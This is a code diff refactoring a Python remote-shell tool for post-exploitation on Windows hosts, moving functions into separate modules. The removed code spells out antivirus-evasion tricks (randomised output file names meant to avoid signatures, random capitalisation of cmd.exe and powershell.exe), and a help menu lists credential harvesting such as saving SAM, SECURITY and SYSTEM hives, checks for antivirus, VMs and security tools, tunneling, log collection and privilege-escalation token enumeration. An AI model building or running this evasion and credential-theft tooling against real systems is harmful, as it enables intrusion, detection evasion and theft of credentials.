@@ -11,38 +11,20 @@ import logging
 import ntpath
 from base64 import b64encode
 from six import PY2
-from av import *
+
+from modules.av.av_procs import av_procs
+from modules.av.evasion import generate_unique_signature
+from modules.av.evasion import generate_temp_permutation
+
+from modules.system_info.sysinfo import basic_system_info
+from modules.system_info.sysinfo import get_mounts
+
+from modules.help.help import print_module_help
+
+from modules.survey.survey import survey
 
 def random_sig():
-    """
-    Function will create a random file name to store the command output before it is read in and returned back to the user
-
-    Return: random file name to avoid signatures, or at least limit signature exposure
-    """
-    guid_or_not = random.randint(1,10)
-    if guid_or_not % 2 == 0:
-
-        rand_length = random.randint(8, 32)
-        if rand_length % 2 == 0:
-            guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=rand_length))
-            guid2 = list(''.join(l + '-' * (n % 4 == 2) for n, l in enumerate(guid)))
-            return '{' + ''.join(guid2) + '}'
-        else:
-            guid = list(''.join(random.choices(string.ascii_uppercase + string.digits, k=rand_length)))
-            guid2 = list(''.join(l + '-' * (n % 4 == 2) for n, l in enumerate(guid)))
-            return '{' + ''.join(guid2) + '}'
-    else:
-
-        rand_length = random.randint(8, 32)
-        if rand_length % 2 == 0:
-            guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=rand_length))
-            guid2 = list(''.join(l + '-' * (n % 4 == 2) for n, l in enumerate(guid)))
-            return ''.join(guid2)
-        else:
-            guid = list(''.join(random.choices(string.ascii_uppercase + string.digits, k=rand_length)))
-            guid2 = list(''.join(l + '-' * (n % 4 == 2) for n, l in enumerate(guid)))
-            return ''.join(guid2)
-
+    return generate_unique_signature()
 
 
 OUTPUT_FILENAME = random_sig()
@@ -50,40 +32,7 @@ CODEC = sys.stdout.encoding
 
 
 def temp_perm(option):
-    """
-    Function will create a permutation on the Temp directory altering its case, results in upper and lower case mix
-
-    Return: a random case on Temp
-    """
-    letters_dir = ['t', 'e', 'm', 'p']
-    letters_cmd = ['c', 'm', 'd', '.', 'e', 'x', 'e']
-    letters_power = ['p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l', '.', 'e', 'x', 'e']
-    final_arr = []
-    if option == "dir":
-        for i in letters_dir:
-            rand_num = random.randint(1, 2)
-            if rand_num == 1:
-                final_arr.append(i.upper())
-            else:
-                final_arr.append(i.lower())
-    elif option == "cmd":
-        for i in letters_cmd:
-            rand_num = random.randint(1, 2)
-            if rand_num == 1:
-                final_arr.append(i.upper())
-            else:
-                final_arr.append(i.lower())
-    elif option == "power":
-        for i in letters_power:
-            rand_num = random.randint(1, 2)
-            if rand_num == 1:
-                final_arr.append(i.upper())
-            else:
-                final_arr.append(i.lower())
-
-    else:
-        pass
-    return ''.join(final_arr)
+    return generate_temp_permutation(option)
 
 
 class RemoteShell(cmd.Cmd):
@@ -131,85 +80,11 @@ class RemoteShell(cmd.Cmd):
         os.system(s)
 
     def do_help(self, line):
-        print("""
- --------------------------------------------------------------------------------------------
- + Basic Module                                                                            +  
- --------------------------------------------------------------------------------------------
-  CRTL+L                      - clear screen
-  sysinfo                     - see basic information about the host
-  lcd {path}                  - changes the current local directory to {path}
-  exit                        - terminates the server process (and this session)
-  lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current dir)
-  lget {file}                 - downloads pathname to the current local dir
-  ! {cmd}                     - executes a local shell cmd
-  cat                         - view file contents
-  ls                          - you should know this, will show hidden files 
- --------------------------------------------------------------------------------------------
- + Process Accounting                                                                      +
- --------------------------------------------------------------------------------------------
-  av                        - looks for Anti-Virus solutions running in the process list
-  defender                  - query Microsoft Defender status
-  vmcheck                   - attempts to detect if we are running in a vm
-  securitytools             - looks for security researcher tools in the process list 
- --------------------------------------------------------------------------------------------
- + Credential Harvesting                                                                    +
- --------------------------------------------------------------------------------------------
-  unattend                   - find all unattended files (potential base64 credentials)
-  regrip                     - save sam, security, system to target pwd
-  creds                      - enumerate LSA Protection, WDigest, Credential Guard, Cached 
-                               logon count 
- --------------------------------------------------------------------------------------------
- + Tunneling                                                                               + 
- --------------------------------------------------------------------------------------------
-  showtun                   - see all tunnels
-  addtun                    - add tunnel --> addtun lport rhost rport --> 10000 10.0.0.1 443
-  deltun                    - delete tunnel --> deltun lport --> deltun 11000  
- --------------------------------------------------------------------------------------------
- + Collection                                                                               +
- --------------------------------------------------------------------------------------------
-  loggrab                   - collects log of your choice --> loggrab Security.evtx 
-  survey                    - performs host survey of target, saves output to local machine
- --------------------------------------------------------------------------------------------
- + Priv Esc                                                                                 +
- --------------------------------------------------------------------------------------------
-  tokens                    - enumerate enabled tokens for priv esc path
-  """)
+        return print_module_help()
+    
 
     def do_survey(self, s):
-        save_local_option = s.split(" ")[0]
-        if save_local_option == "save":
-            try:
-                logging.info("Saving all output from survey to survey.txt in your local pwd")
-                logging.info("Starting Survey")
-                # can have issues here if survey with save option is run on multiple tgts. Should append remote host ip or atleast a timestamp...
-                local_save_file = open("survey.txt", "a")
-
-                config_file = open("survey.conf", "r+")
-                current_line = config_file.readline()
-
-                for item in config_file:
-                    local_save_file.write("[*] %s \n" % (item))
-                    self.execute_remote(item.strip('\n'))
-                    time.sleep(1)
-                    local_save_file.write(self.__outputBuffer.strip('\r\n') + '\n')
-                    self.__outputBuffer = ''
-                logging.info("Survey Completed")
-            except Exception as e:
-                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
-        else:
-            try:
-                logging.info("Starting Survey")
-                config_file = open("survey.conf", "r+")
-                current_line = config_file.readline()
-
-                for item in config_file:
-                    print("[*] %s" % (item))
-                    self.execute_remote(item.strip('\n'))
-                    time.sleep(1)
-                    self.format_print_buff()
-                logging.info("Survey Completed")
-            except Exception as e:
-                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
+        survey(self, s)
 
     def do_loggrab(self, s):
         try:
@@ -229,37 +104,11 @@ class RemoteShell(cmd.Cmd):
             print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
 
     def do_mounts(self, s):
-        try:
-            self.execute_remote("wmic logicaldisk get description,name")
-            find_description_start = "Description"
-            if len(self.__outputBuffer.strip('\r\n')) > 0:
-                new_buff = self.__outputBuffer.split("codec")[0]
-                print(new_buff)
-                self.__outputBuffer = ''
-
-        except Exception as e:
-            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
+        return get_mounts(self, s)
 
     def do_sysinfo(self, s):
-        try:
-            logging.info("Target")
-            self.execute_remote('whoami')
-            self.format_print_buff()
-
-            logging.info("Hostname")
-            self.execute_remote('hostname')
-            self.format_print_buff()
-
-            logging.info("Arch: ")
-            self.execute_remote('SET Processor | findstr /i "PROCESSOR_ARCHITECTURE"')
-            self.format_print_buff()
-
-            logging.info("IP Addresses: ")
-            self.execute_remote('ipconfig /all | findstr /i "(Preferred)"')
-            self.format_print_buff()
-
-        except Exception as e:
-            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
+        return basic_system_info(self, s)
+        
 
     def do_lcd(self, s):
         if s == '':
